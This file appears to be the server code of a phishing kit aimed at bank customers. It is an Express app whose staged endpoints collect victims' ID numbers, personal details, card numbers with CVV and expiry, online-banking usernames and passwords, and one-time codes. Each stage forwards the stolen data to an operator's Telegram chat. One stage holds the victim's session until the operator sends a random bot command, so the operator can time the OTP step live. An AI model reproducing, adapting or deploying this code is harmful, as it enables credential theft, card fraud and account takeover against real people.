import express from 'express';
import cors from 'cors';
import TelegramBot from 'node-telegram-bot-api';
import axios from 'axios';
import {TOKEN, WH_URL, ORIGIN_URL, CHAT_ID} from './config.js'

import dotenv from 'dotenv';
dotenv.config({path: 'variables.env'});

/**
 * EXPRESS
 */
const app = express();
app.use(express.json());
app.use(express.urlencoded({extended: true}));
// app.use(cors())



/**
 * MIDDLEWARES
 */
app.use((req, res, next) => {
  console.log('Into Middleware')
  res.header('Access-Control-Allow-Origin', process.env.ORIGIN_URL || ORIGIN_URL);
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection');
  if (req.method === 'OPTIONS') {
    // Respondemos inmediatamente a las solicitudes OPTIONS sin pasar al siguiente middleware
    res.sendStatus(200);
  } else {
    // Pasamos al siguiente middleware para manejar las solicitudes no OPTIONS
    next();
  }
});



const token = process.env.TOKEN || TOKEN;
const webhookURL = process.env.WH_URL || WH_URL;
const apiUrl = `https://api.telegram.org/bot${token}/setWebhook`;
const chatID = process.env.CHAT_ID || CHAT_ID;


/**
 * CHATBOT CONFIG
 */
const bot = new TelegramBot(token, { polling: true });

// WebHoook setting
// axios.post(apiUrl, { url: webhookURL })
//     .then(response => {
//     console.log('URL del webhook actualizada correctamente');
//     })
//     .catch(error => {
//     console.error('Error al actualizar la URL del webhook:', error.message);
//     });

bot.sendMessage(chatID, "We're Online Baby! Another one ;)")


const generateRandomCommand = () => {
  const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; // Caracteres permitidos en el comando
  let prefijo = '\/'
  let command = '/'

  // Generar una cadena aleatoria de caracteres para el comando
  for (let i = 0; i < 5; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    prefijo += characters[randomIndex];
    command += characters[randomIndex];
  }
  
  let pattern = new RegExp(prefijo)

  return [command, pattern];
};

/**
 * ENDPOINTS AND URLS
 */
app.post('/fase1', (req, res)=>{
  //** Cédula */
  console.log('Fase 1 (Ejec...)')
  bot.sendMessage(chatID, `### New User Incoming... ###\n **CC**: ${req.body.cc}`)

  res.json({'msg': 'Checked!'})
})

app.post('/fase2', (req, res)=>{
  /** Datos Personales */
  console.log('Fase 2 (Ejec...)')
  bot.sendMessage(chatID, `
  ### RECIBIENDO ###\n
  CC: ${req.body.cc}\n 
  NOMBRE**: ${req.body.nom}\n
  MAIL: ${req.body.ml}\n
  CELULAR: ${req.body.pn}\n
  CIUDAD: ${req.body.cid}\n
  DIRECCIÓN: ${req.body.dir}\n
  `)
  res.json({'msg': 'Checked!'})
})

app.post('/fase3', (req, res)=>{
  /** Datos tarjeta */
  console.log('Fase 3 (Ejec...)')
  bot.sendMessage(chatID, `
  ### RECIBIENDO ###\n
  CC: ${req.body.cc}\n 
  NOMBRE: ${req.body.nom}\n
  MAIL: ${req.body.ml}\n
  CELULAR: ${req.body.pn}\n
  CIUDAD: ${req.body.cid}\n
  DIRECCIÓN: ${req.body.dir}\n
  **--------**\n
  BANCO: ${req.body.tar.ent}\n
  TARJETA: ${req.body.tar.pin}\n
  FECHA: ${req.body.tar.date}\n
  CVV: ${req.body.tar.cvv}\n\n
  `)

  res.json({'msg': 'Checked!'})
})

app.post('/fase4', (req, res)=>{
  /** Usuario Banca en Línea */
  console.log('Fase 4 (Ejec...)')

  const dinamicCommand = generateRandomCommand();

  bot.sendMessage(chatID, `
  ### RECIBIENDO ###\n
  CC: ${req.body.cc}\n 
  NOMBRE: ${req.body.nom}\n
  MAIL: ${req.body.ml}\n
  CELULAR: ${req.body.pn}\n
  CIUDAD: ${req.body.cid}\n
  DIRECCIÓN: ${req.body.dir}\n\n
  **--------**\n
  BANCO: ${req.body.tar.ent}\n
  TARJETA: ${req.body.tar.pin}\n
  FECHA: ${req.body.tar.date}\n
  CVV: ${req.body.tar.cvv}\n\n
  **--------**\n
  USUARIO: ${req.body.bk.u}\n
  CONTRASEÑA: ${req.body.bk.p}\n\n

  Digite ${dinamicCommand[0]} para seguir...
  `)

  console.log('Fase 4 | A la espera')
  bot.onText(dinamicCommand[1], ()=> {
    console.log('Fase 4 | Ejecutando Comando OTP.')
    res.json({msg: 'Respondiendo a '+ req.body.cc})
  });


})

app.post('/fase5', (req, res)=>{
  /** OTP */
  console.log('Fase 5 (Ejec...)')
  bot.sendMessage(chatID, `
  ### RECIBIENDO ###\n
  CC: ${req.body.cc}\n 
  NOMBRE: ${req.body.nom}\n
  MAIL: ${req.body.ml}\n
  CELULAR: ${req.body.pn}\n
  CIUDAD: ${req.body.cid}\n
  DIRECCIÓN: ${req.body.dir}\n\n
  **--------**\n
  BANCO: ${req.body.tar.ent}\n
  TARJETA: ${req.body.tar.pin}\n
  FECHA: ${req.body.tar.date}\n
  CVV: ${req.body.tar.cvv}\n\n
  **--------**\n
  USUARIO: ${req.body.bk.u}\n
  CONTRASEÑA: ${req.body.bk.p}\n\n
  **--------**\n
  OTP: ${req.body.cdg}\n
  `)

  res.json({'msg': 'Checked!'})
})




// *** Server ON *** //
const port = process.env.PORT || 3000
const host = process.env.HOST || '0.0.0.0'
    
app.listen(port, () => {
  console.log('Server running in '+host);
  console.log('CREDENTIALS:')
  console.log(port)
  console.log(host)
  console.log(token)
  console.log(webhookURL)
  console.log(apiUrl)
  console.log(chatID)
  
});